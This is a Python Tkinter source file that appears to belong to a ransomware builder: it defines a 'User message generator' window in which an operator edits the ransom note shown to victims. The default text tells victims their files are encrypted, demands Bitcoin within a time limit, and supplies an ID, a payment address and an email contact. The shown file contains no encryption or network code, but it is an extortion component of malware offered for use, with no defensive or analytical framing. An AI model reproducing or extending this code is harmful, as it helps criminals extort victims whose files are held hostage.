from tkinter import *

TITLE_MESSAGE = "Your files have been encrypted!"
INFO_MESSAGE = "Your files have been encrypted. If you wish to recover them, you need to pay {}$ worth of Bitcoin "\
               "and follow the payment instructions. If you don't pay the ransom within {} hours the access to your files " \
               "will be permanently lost. Click 'Show files' button to review which files are encrypted."
PAYMENT_MESSAGE = "Your ID: {}\nBitcoin address: {}\nEmail: {}\n\nPay the ransom to the given bitcoin address and send"\
                  " the transaction alongside with your id to the email address."
DECRYPTION_MESSAGE = "Once the payment is received you will get your decryption key. Insert the key into the box and click 'Decrypt'."

WARNING_MESSAGE = "Do not attempt to decrypt the files yourself! It may cause permanent data loss.\n" \
                  "Do not rename your files, as it would prevent the decryptor from accessing them.\n"\
                  "Do not remove this program. You need it for decrypting your files. Otherwise " \
                  "you will have to redownload it."

def concatenate_message():
    return \
        TITLE_MESSAGE + "\n" + INFO_MESSAGE + "\n" + PAYMENT_MESSAGE + "\n" + DECRYPTION_MESSAGE  + "\n" + WARNING_MESSAGE + "\n"


def generate_default(_id, payment, payment_details, time_limit, contact):
    info = INFO_MESSAGE.format(payment, time_limit)
    pay = PAYMENT_MESSAGE.format(_id,payment_details,contact)
    return TITLE_MESSAGE + "\n" + info + "\n" + pay + "\n" + DECRYPTION_MESSAGE + "\n" + WARNING_MESSAGE + "\n"

class UserMessage(Toplevel):
    def __init__(self, _id, time_limit, payment, payment_details, contact, current_message=None):
        Toplevel.__init__(self)
        self.id = _id
        self.time_limit =time_limit
        self.payment = payment
        self.payment_details = payment_details
        self.contact = contact
        self.message = current_message if current_message else self.__default_message()
        self.geometry('590x450')
        self.title("User message generator")
        self.resizable(False, False)

        self.message_box = Text(self, wrap=WORD, height=25, width=70)
        self.message_box.place(x=10, y=10)
        self.message_box.insert(INSERT, self.message)

        Button(self, text="Save", command=self.__save_message).place(x=200, y=420)
        Button(self, text="Clear", command=self.__clear_text).place(x=250, y=420)
        Button(self, text="Default", command=self.__generate_default).place(x=300, y=420)

        self.message_box.bind("<Return>", self.__save_message)
        self.grab_set()

    def run(self):
        self.wm_deiconify()
        self.message_box.focus_force()
        self.wait_window()

        return self.message

    def __default_message(self):
        return generate_default(self.id, self.payment, self.payment_details, self.time_limit, self.contact)

    def __generate_default(self):
        self.message = self.__default_message()
        self.__clear_text()
        self.message_box.insert(INSERT, self.message)

    def __save_message(self):
        self.message = self.message_box.get("1.0", "end-1c")
        self.destroy()

    def __clear_text(self):
        self.message_box.delete('1.0', END)
